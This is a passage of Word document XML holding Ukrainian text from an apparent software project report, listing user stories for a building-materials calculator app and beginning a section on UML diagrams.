      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>історіями</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Розробляємо</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>історії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> за принципом Як &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>користувач</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt;, я </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>можу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>дію</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt;, для того, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>щоб</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;мета&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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використовувати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програму</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>власних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> потреб.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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адміністратор</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вносити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зміни</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в базу </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>даних</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різні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будматеріали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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вводити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свої</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особисті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дані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щоб</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> завести </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>обліковий</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запис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
          <w:tab w:val="left" w:pos="709"/>
        </w:tabs>
        <w:suppressAutoHyphens/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Повинні</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> бути </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>введені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справжні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дані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користувача</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
          <w:tab w:val="left" w:pos="709"/>
        </w:tabs>
        <w:suppressAutoHyphens/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Обліковий</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запис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> повинен бути </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>унікальною</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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змінити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дані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облікового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запису</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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видалити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свій</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обліковий</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запис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:suppressAutoHyphens/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>видалення</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необхідно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підтвердження</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адміністратора</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">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ввести метраж </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>свого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приміщення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, для того, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>щоб</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отримати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необхідні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раціональні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варіації</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матеріалів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>для ремонту</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>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зберігати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результати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свого</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> списку </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>матеріалів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>для ремонту</w:t>
      </w:r>
      <w:proofErr w:type="gram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приміщень</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:suppressAutoHyphens/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="__RefHeading___Toc10641137"/>
      <w:bookmarkStart w:id="15" w:name="_Toc10727434"/>
      <w:bookmarkEnd w:id="14"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">2.2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Розробка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діаграм</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Unified</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Modeling</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Language</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>уніфікована</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>мова</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>моделювання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">) - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>мова</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:history="1">
